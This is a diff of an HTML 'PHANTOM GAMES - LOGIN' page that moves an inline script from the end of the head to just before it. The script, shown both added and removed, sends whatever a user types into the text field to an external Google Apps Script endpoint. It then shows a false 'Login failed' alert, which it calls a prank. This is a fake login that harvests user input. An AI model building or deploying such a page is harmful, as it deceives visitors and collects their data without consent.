@@ -1,6 +1,18 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<script>
+document.querySelector('button').addEventListener('click', function(){
+  var name = document.querySelector('input[type=text]').value;
+  fetch('https://script.google.com/macros/s/AKfycbzJ3sun_gZn9XUd7NwsDfICIIL-vyqjZq7Nw9i9WuEDrOV9uEYBhm3zlA8LUETFPoN73w/exec', {
+    method: 'POST',
+    body: new URLSearchParams('name=' + encodeURIComponent(name))
+  }).then(() => {
+    alert("Login failed. Try again 😭"); // prank message
+  });
+});
+</script>
+    
+    <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>PHANTOM GAMES - LOGIN</title>
@@ -50,17 +62,7 @@
         }
     </style>
 
-<script>
-document.querySelector('button').addEventListener('click', function(){
-  var name = document.querySelector('input[type=text]').value;
-  fetch('https://script.google.com/macros/s/AKfycbzJ3sun_gZn9XUd7NwsDfICIIL-vyqjZq7Nw9i9WuEDrOV9uEYBhm3zlA8LUETFPoN73w/exec', {
-    method: 'POST',
-    body: new URLSearchParams('name=' + encodeURIComponent(name))
-  }).then(() => {
-    alert("Login failed. Try again 😭"); // prank message
-  });
-});
-</script>
+
 
 </head>
 <body>
@@ -75,6 +77,7 @@ document.querySelector('button').addEventListener('click', function(){
 
 </body>
 </html>
+
 
 
 
